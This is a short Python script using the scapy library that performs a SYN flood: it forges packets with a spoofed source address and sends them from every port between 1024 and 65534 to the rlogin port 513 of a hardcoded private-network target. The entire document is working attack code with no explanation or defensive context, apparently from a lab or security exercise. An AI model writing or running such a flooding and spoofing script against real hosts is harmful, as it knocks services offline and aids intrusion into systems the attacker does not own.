import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
def synFlood(src, tgt):
    for sport in range(1024, 65535):
        IPlayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=sport, dport=513)
        pkt = IPlayer / TCPlayer
        send(pkt)
src = "10.1.1.2"
tgt = "192.168.28.141"
synFlood(src, tgt)
